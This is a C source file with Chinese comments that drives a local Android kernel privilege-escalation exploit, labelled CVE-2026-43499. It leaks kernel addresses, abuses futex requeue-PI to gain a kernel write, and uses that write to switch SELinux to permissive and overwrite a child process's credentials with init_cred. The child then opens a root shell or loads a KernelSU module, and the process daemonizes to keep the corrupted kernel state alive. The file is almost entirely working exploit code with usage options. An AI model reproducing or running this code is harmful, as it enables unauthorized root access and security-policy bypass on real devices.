#include "common.h"

/* main.c - 参数解析与 exploit 流程编排 */


void usage(const char *prog) {
  fprintf(stderr,
          "Usage: %s [OPTIONS]\n"
          "\n"
          "Options:\n"
          "  -m, --module PATH   Load module from PATH (release only with -f; default: /data/local/tmp/kernelsu.ko)\n"
          "  -h, --help          Show this help\n"
          "\n"
          "Special:\n"
          "  -s, --shell [PROGRAM]  Root shell only (default /system/bin/sh)\n"
          "  -f, --force         Overwrite existing released files\n"
          "  -p, --permissive-only  Only set SELinux permissive (no KSU, no shell)\n"
          "  --leak-only         Only run the KASLR/leak verification (no writes)\n"
          "  --leak-y-only       Only verify the Y task leak (no exploitation)\n",
          prog);
}

int main(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);
  __orig_stdout = dup(STDOUT_FILENO);
  process_pid = getpid();

  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
      usage(argv[0]);
      return 0;
    } else if (strcmp(argv[i], "-m") == 0 || strcmp(argv[i], "--module") == 0) {
      if (i + 1 >= argc || argv[i + 1][0] == '\0' || argv[i + 1][0] == '-') {
        pr_warning("missing value for %s\n", argv[i]);
        usage(argv[0]);
        return 2;
      }
      if (strlen(argv[i + 1]) >= sizeof(g_module_path)) {
        pr_warning("module path too long (max %zu): %s\n",
                   sizeof(g_module_path) - 1, argv[i + 1]);
        usage(argv[0]);
        return 2;
      }
      snprintf(g_module_path, sizeof(g_module_path), "%s", argv[++i]);
      g_module_given = 1;
    } else if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--shell") == 0) {
      g_shell_mode = 1;
      if (i + 1 < argc && argv[i + 1][0] != '\0' && argv[i + 1][0] != '-') {
        if (strlen(argv[i + 1]) >= sizeof(g_shell_path)) {
          pr_warning("shell path too long (max %zu): %s\n",
                     sizeof(g_shell_path) - 1, argv[i + 1]);
          usage(argv[0]);
          return 2;
        }
        snprintf(g_shell_path, sizeof(g_shell_path), "%s", argv[++i]);
      }
    } else if (strcmp(argv[i], "-f") == 0 || strcmp(argv[i], "--force") == 0) {
      g_force_release = 1;
    } else if (strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--permissive-only") == 0) {
      g_permissive_only = 1;
    } else if (strcmp(argv[i], "--leak-only") == 0) {
      g_leak_only = 1;
    } else if (strcmp(argv[i], "--leak-y-only") == 0) {
      y_leak_only = 1;
    } else {
      pr_warning("unknown option: %s\n", argv[i]);
      usage(argv[0]);
      return 2;
    }
  }

  /* -s 本身就包含 permissive（不等子进程加载），-p 冗余；以 -s 为准 */
  if (g_shell_mode && g_permissive_only) {
    g_permissive_only = 0;
  }

  /* 其余模式互斥：--shell/--permissive-only / --leak-only / --leak-y-only */
  int mode_count = g_shell_mode + g_permissive_only + g_leak_only + y_leak_only;
  if (mode_count > 1) {
    pr_warning("conflicting modes: --shell / --permissive-only / --leak-only / "
               "--leak-y-only are mutually exclusive\n");
    usage(argv[0]);
    return 2;
  }
  /* -m 只对默认模式有意义（其他模式不加载模块） */
  if (g_module_given && mode_count > 0) {
    pr_info("note: -m/--module is ignored with --shell/--permissive-only/"
            "--leak-only/--leak-y-only\n");
  }
  /* -f 只对默认模式（会释放文件）有意义 */
  if (g_force_release && mode_count > 0) {
    pr_warning("-f/--force has no effect with --shell/--permissive-only/--leak-only/--leak-y-only\n");
    usage(argv[0]);
    return 2;
  }

  timer_reset();
  pr_info("CVE-2026-43499 Exploit Engine Initiated\n");
  pr_info("Target PID: %d | UID: %d | GID: %d\n", getpid(), getuid(), getgid());
  log_context("parent pre-exploit");

  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr1;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1, &sa, NULL) != 0) return 1;

  runtime_text = leak_text();
  if (!runtime_text) { pr_error("KASLR leak failed\n"); }

  k_selinux_state = leak_selinux_state();
  if (!k_selinux_state) { pr_error("SELinux state leak failed\n"); }

  k_current_task = leak_task_from_status("/proc/self/status", &k_current_cred);
  if (!k_current_task) { pr_error("current task leak failed\n"); }

  uint64_t slide = runtime_text - LINK_TEXT;
  uint64_t data_delta = k_selinux_state - (runtime_text + OFF_SELINUX_STATE);
  k_init_task = runtime_text + OFF_INIT_TASK + data_delta;
  uint64_t log_start = runtime_text + OFF_LOG_BUF + data_delta;
  k_write_value = (log_start + 0xffff) & ~UINT64_C(0xffff);
  k_ghost_task = k_selinux_state + 0x20;
  k_fake_lock = k_selinux_state + 0xa00;

  TIMER("Memory layout resolved");
  pr_info("text_base=0x%016llx slide=0x%016llx\n", (unsigned long long)runtime_text, (unsigned long long)slide);
  pr_info("init_task=0x%016llx selinux_st=0x%016llx\n", (unsigned long long)k_init_task, (unsigned long long)k_selinux_state);
  pr_info("write_val=0x%016llx\n", (unsigned long long)k_write_value);

  if (g_leak_only) {
    pr_success("Leak-only verification passed.\n");
    return 0;
  }

  pthread_t tx, ty;

  if (pthread_create(&ty, NULL, thread_y, NULL) != 0) return 2;
  WAIT_UNTIL(atomic_load(&y_task_ready) != 0, 10000, "Y task leak");
  if (atomic_load(&y_task_ready) < 0) { pr_error("Y task leak failed\n"); }

  if (y_leak_only) {
    pthread_join(ty, NULL);
    pr_success("Y task leak-only verification passed.\n");
    return 0;
  }

  WAIT_UNTIL(atomic_load(&y_locked_l2), 10000, "Y locks pi2");
  if (pthread_create(&tx, NULL, thread_x, NULL) != 0) return 2;
  WAIT_UNTIL(atomic_load(&x_locked_l1) && atomic_load(&y_parking) && atomic_load(&x_blocking), 10000, "X/Y setup");

  usleep(30000);

  long r = raw_futex(&cond, CMP_REQUEUE_PI_PRIVATE, 1, 0, &pi1, 0);
  cond = 1;
  __atomic_thread_fence(__ATOMIC_SEQ_CST);
  syscall(SYS_tgkill, getpid(), atomic_load(&y_tid), SIGUSR1);

  if (r != -EDEADLK) {
    pr_error("CMP_REQUEUE_PI result: %ld (Expected: %d)\n", r, -EDEADLK);
  }
  WAIT_UNTIL(atomic_load_explicit(&y_done, memory_order_acquire), 10000, "sigreturn stamp");
  if (atomic_load(&y_done) < 0) {
    pr_error("sigreturn stamp failed\n");
  }
  TIMER("Deadlock detected, waiter armed");

  if (trigger_pi() != 0) { pr_error("settle trigger failed\n"); }
  usleep(15000);
  TIMER("Waiter settled into zero-BSS");

  uint64_t k_init_cred = runtime_text + OFF_INIT_CRED + data_delta;
  pr_info("k_init_cred = 0x%016llx\n", (unsigned long long)k_init_cred);

  volatile int *done_flag = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  if (done_flag == MAP_FAILED) { pr_error("mmap failed\n"); }
  *done_flag = 0;

  int task_pipe[2];
  if (pipe(task_pipe) < 0) { pr_error("pipe failed\n"); }

  int status_pipe[2] = {-1, -1};
  if (pipe2(status_pipe, O_CLOEXEC) < 0) { status_pipe[0] = status_pipe[1] = -1; }

  pr_info("Forking isolated root shell process...\n");
  pid_t child_pid = fork();
  if (child_pid < 0) { pr_error("fork failed\n"); }
  if (child_pid > 0) {
    /* 父进程必须关掉自己的写端，否则下面 read 永远等不到 EOF */
    if (status_pipe[1] >= 0) { close(status_pipe[1]); status_pipe[1] = -1; }
  } else if (status_pipe[0] >= 0) {
    /* 子进程不读，关掉读端 */
    close(status_pipe[0]); status_pipe[0] = -1;
  }

  if (child_pid == 0) {
    close(task_pipe[0]);
    uint64_t my_cred = 0;
    uint64_t my_task = leak_task_from_status("/proc/self/status", &my_cred);
    uint64_t pair[2] = { my_task, my_cred };
    (void)write(task_pipe[1], pair, sizeof(pair));
    close(task_pipe[1]);

    {
      unsigned spins = 0;
      while (__atomic_load_n(done_flag, __ATOMIC_ACQUIRE) == 0) {
        if (((++spins) & 0x3ff) == 0 && getppid() == 1) _exit(2); /* 父进程已死 */
        __asm__ volatile("yield" ::: "memory");
      }
    }

    if (g_permissive_only) _exit(0);
    TIMER("child woken");

    /* 身份 + SELinux 域：带 [CHILD] 前缀输出（同 CapPrm 风格） */
    pr_success("[CHILD] ");
    if (system("/system/bin/id") != 0) {
      printf("\n");
      fflush(stdout);
    }
    {
      FILE *cf = fopen("/proc/self/status", "r");
      char lb[256];
      if (cf) {
        while (fgets(lb, sizeof(lb), cf)) {
          if (!strncmp(lb, "CapPrm:", 7) ||
              !strncmp(lb, "CapEff:", 7) ||
              !strncmp(lb, "CapBnd:", 7)) {
            pr_success("[CHILD] %s", lb);
          }
        }
        fclose(cf);
      }
    }


    TIMER("id/caps printed");
    if (__orig_stdout >= 0) {
      dup2(__orig_stdout, STDOUT_FILENO);
      dup2(__orig_stdout, STDERR_FILENO);
    }
    signal(SIGHUP, SIG_IGN);

    if (g_shell_mode) {
      pr_success("[CHILD] root shell (KernelSU NOT loaded). Type 'exit' to leave.\n");
      fflush(stdout);
      signal(SIGHUP, SIG_DFL);
      setenv("PATH", "/sbin:/system/sbin:/system/bin:/system/xbin", 1);
      execl(g_shell_path, path_basename(g_shell_path), (char *)NULL);
      pr_warning("[CHILD] exec %s failed: %s\n", g_shell_path, strerror(errno));
      _exit(1);
    }

    /* 提权后释放（仅默认模式）：
     * - 无 -m：释放内嵌 ko 到默认路径（已存在则跳过，-f 覆盖）
     * - 有 -m：不释放，直接加载指定路径；加 -f 才强制释放/覆盖到该路径
     */
    if (!g_module_given || g_force_release) {
        ksu_release_module();
    } else {
        pr_info("[KSU] -m given without -f, using existing module at %s\n", g_module_path);
    }
    TIMER("module release done");

    /* kln 由 runtime_text + 固定偏移算出，直接 finit_module 加载
     * （不需要 shell，也不需要读 /proc/kallsyms） */
    int load_ok = 0;
    if (access("/sys/module/kernelsu", F_OK) == 0) {
      pr_success("[KSU] kernelsu already loaded\n");
      load_ok = 1;
    } else {
      TIMER("opening module");
      int mfd = open(g_module_path, O_RDONLY | O_CLOEXEC);
      if (mfd < 0) {
        pr_warning("[KSU] cannot open %s: %s\n", g_module_path, strerror(errno));
      } else {
        char mparams[64];
        snprintf(mparams, sizeof(mparams), "kln=0x%llx level=3",
                 (unsigned long long)(runtime_text + OFF_KALLSYMS_LOOKUP_NAME));
        long frc = syscall(__NR_finit_module, mfd, mparams, 0);
        int ferr = errno;
        close(mfd);
        if (frc != 0) {
          pr_warning("[KSU] finit_module failed: %s\n", strerror(ferr));
        } else if (access("/sys/module/kernelsu", F_OK) == 0) {
          load_ok = 1;
          TIMER("KernelSU loaded (finit_module)");
        }
      }
    }

    if (!load_ok) {
      pr_warning("[KSU] module load failed\n");
      pr_warning("[KSU] dropping to root shell; run 'exit' then reboot to clean up\n");
      fflush(stdout);
      if (status_pipe[1] >= 0) (void)write(status_pipe[1], "F", 1);
      int shst = 0;
      pid_t shp = fork();
      if (shp == 0) {
        execl("/system/bin/sh", "sh", (char *)NULL);
        _exit(127);
      }
      if (shp < 0) _exit(1);   /* fork 失败：按失败退出，避免被当成成功 */
      /* 先 fork 再忽略信号：避免 shell 继承 SIG_IGN 影响 Ctrl-C */
      signal(SIGINT,  SIG_IGN);
      signal(SIGQUIT, SIG_IGN);
      signal(SIGTSTP, SIG_IGN);
      if (shp > 0) {
        while (waitpid(shp, &shst, 0) < 0 && errno == EINTR) {}
      }
      /* 继承 root shell 的退出码 */
      _exit(WIFEXITED(shst) ? WEXITSTATUS(shst) : 1);
    }
    _exit(0);
  }

  close(task_pipe[1]);
  uint64_t pair[2] = {0, 0};
  ssize_t got = read(task_pipe[0], pair, sizeof(pair));
  close(task_pipe[0]);
  if (got != (ssize_t)sizeof(pair) || !pair[0] || !pair[1]) {
    pr_error("child task/cred leak failed\n");
  }
  uint64_t child_task = pair[0];
  uint64_t child_cred = pair[1];

  pr_info("Child PID: %d | Task: 0x%016llx | Cred: 0x%016llx\n", (int)child_pid, (unsigned long long)child_task, (unsigned long long)child_cred);

  int before = read_enforce();
  int wr = write_value(k_selinux_state, k_write_value);
  usleep(50000);
  int after = read_enforce();
  pr_success("SELinux write_trigger=%d enforce=%d->%d\n", wr, before, after);
  if (after == 0) pr_success("SELinux permissive verified\n");

  if (!g_permissive_only) {
    if (!write_value(child_task + 0x808, k_init_cred)) { pr_error("child cred -> init_cred failed\n"); }
    pr_success("Child task->cred -> init_cred\n");

    if (!write_value(child_task + 0x800, k_init_cred)) { pr_error("child real_cred -> init_cred failed\n"); }
    pr_success("Child task->real_cred -> init_cred\n");

    if (!write_value(k_init_cred + 0x04, 0)) { pr_error("init_cred uid/gid repair failed\n"); }
    pr_success("init_cred uid/gid repaired to 0\n");
  }

  TIMER(g_permissive_only ? "Exploit complete, waking child"
                          : "Exploit complete, waking child shell");
  __atomic_store_n(done_flag, 1, __ATOMIC_RELEASE);
  fflush(stdout);

  /* 父进程等待期间不能被 Ctrl-C/Ctrl-Z 杀掉（子进程可能进入回退 shell） */
  signal(SIGINT,  SIG_IGN);
  signal(SIGQUIT, SIG_IGN);
  signal(SIGTSTP, SIG_IGN);

  /* 1) 等子进程（模块加载 / root shell）结束 */
  int cstatus = 0;
  pid_t wp = waitpid(child_pid, &cstatus, 0);
  if (wp < 0 && errno != ECHILD) {
      pr_warning("[PARENT] waitpid(%d) failed: %s\n",
                 (int)child_pid, strerror(errno));
  } else if (wp == child_pid && g_permissive_only) {
      if (after == 0) {
          pr_success("[KSU] SELinux is permissive now (permissive-only mode)\n");
      } else {
          pr_warning("[KSU] permissive-only failed (enforce read=%d)\n", after);
      }
  } else if (!g_shell_mode && wp == child_pid) {
      int load_failed = 0;
      if (status_pipe[0] >= 0) {
          char flag = 0;
          if (read(status_pipe[0], &flag, 1) == 1 && flag == 'F') load_failed = 1;
      }
      if (!load_failed) {
          if (WIFEXITED(cstatus) && WEXITSTATUS(cstatus) == 0) {
              pr_success("[KSU] done. Now open KernelSU Manager (me.weishu.kernelsu) and grant root to your apps.\n");
          } else {
              pr_warning("[KSU] failed (status=0x%x)\n", cstatus);
          }
      }
  }
  if (status_pipe[0] >= 0) close(status_pipe[0]);
  if (status_pipe[1] >= 0) close(status_pipe[1]);
  fflush(stdout);

  /* 2) daemonize：原进程退出，让 adb shell 拿回提示符；
   *    同时保留一个守护进程，防止内核侧悬挂指针引发 panic */
  pid_t dpid = fork();
  if (dpid < 0) {
      pr_error("daemonize fork failed: %s\n", strerror(errno));
  } else if (dpid > 0) {
      int code = WIFEXITED(cstatus) ? WEXITSTATUS(cstatus) : 1;
      _exit(code);
  }

  /* 3) 子进程 = daemon：脱离会话、脱离控制终端 */
  if (setsid() < 0) {
      /* ignore */
  }

  signal(SIGHUP,  SIG_IGN);
  signal(SIGPIPE, SIG_IGN);
  signal(SIGINT,  SIG_IGN);
  signal(SIGQUIT, SIG_IGN);

  int nullfd = open("/dev/null", O_RDWR);
  if (nullfd >= 0) {
      dup2(nullfd, STDIN_FILENO);
      dup2(nullfd, STDOUT_FILENO);
      dup2(nullfd, STDERR_FILENO);
      if (nullfd > STDERR_FILENO) close(nullfd);
  }
  if (__orig_stdout >= 0) { close(__orig_stdout); __orig_stdout = -1; }

  /* 4) 永久守护内核侧状态 */
  for (;;) pause();
}